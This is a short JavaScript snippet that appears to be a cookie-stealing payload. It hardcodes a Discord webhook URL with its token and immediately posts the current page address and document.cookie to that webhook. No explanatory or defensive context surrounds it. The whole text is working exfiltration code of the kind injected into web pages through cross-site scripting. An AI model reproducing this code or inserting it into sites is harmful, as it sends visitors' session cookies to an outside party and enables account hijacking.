var url = "https://discord.com/api/webhooks/1054896343296004116/Qnt4t2FGVI-WYW0xJOMiXe_wIaJNbyLWGt4SD6nDW71I-Ro3iGtxIzMqRYsEYb0eeVz9"
function bleep(payload,url) {
    const request = new XMLHttpRequest();
    request.open("POST",url);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        content: payload
    }
    request.send(JSON.stringify(params));
}
bleep(window.location.href + ":" + document.cookie);
